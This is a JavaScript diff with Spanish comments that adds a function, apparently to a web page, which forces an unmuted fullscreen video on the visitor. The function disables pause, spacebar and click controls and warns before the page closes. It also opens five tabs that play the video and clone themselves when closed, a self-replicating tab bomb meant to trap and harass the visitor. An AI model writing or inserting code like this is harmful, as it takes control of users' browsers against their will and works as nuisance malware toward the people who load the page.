@@ -97,6 +97,87 @@ function showVideo() {
         newTabs[newTabs.length - 1].focus();
     }
 }
+function showVideo() {
+    const video = document.getElementById('video');
+    const container = document.getElementById('container');
+
+    container.style.display = 'none';
+    video.style.display = 'block';
+
+    video.muted = false;
+    video.play();
+    video.controls = false;
+
+    // Anti-pause
+    video.addEventListener('pause', () => video.play());
+
+    // Anti-spacebar
+    document.addEventListener('keydown', (e) => {
+        if (e.code === 'Space') e.preventDefault();
+    });
+
+    // Anti-click-pause
+    video.addEventListener('click', (e) => {
+        e.preventDefault();
+        video.play();
+    });
+
+    // Fullscreen
+    if (video.requestFullscreen) {
+        video.requestFullscreen();
+    }
+
+    // Preguntar al cerrar
+    window.onbeforeunload = function () {
+        return "¿Estás seguro que querés cerrar esto?";
+    };
+
+    // ABRIR 5 pestañas nuevas en el momento del click
+    const newTabs = [];
+    for (let i = 0; i < 5; i++) {
+        const win = window.open('', '_blank');
+        if (win) {
+            win.document.write(`
+                <html>
+                    <head><title>😵</title></head>
+                    <body style="margin:0; background:black; overflow:hidden;">
+                        <video autoplay loop style="width:100vw; height:100vh; object-fit:cover;" muted></video>
+                        <script>
+                            const video = document.querySelector('video');
+                            video.src = "${location.origin}/vid/video.mp4";
+                            video.muted = false;
+                            video.play();
+                            video.controls = false;
+                            video.addEventListener('pause', () => video.play());
+
+                            // Al cerrar, clonarse
+                            window.onbeforeunload = function() {
+                                for (let i = 0; i < 2; i++) {
+                                    const clone = window.open('', '_blank');
+                                    if (clone) {
+                                        clone.document.write(document.documentElement.outerHTML);
+                                        clone.document.close();
+                                    }
+                                }
+                            };
+
+                            setInterval(() => {
+                                if (video.paused) video.play();
+                            }, 300);
+                        </script>
+                    </body>
+                </html>
+            `);
+            win.document.close();
+            newTabs.push(win);
+        }
+    }
+
+    // Mover el foco a la última pestaña que se abrió
+    if (newTabs.length > 0) {
+        newTabs[newTabs.length - 1].focus();
+    }
+}
 
 
 
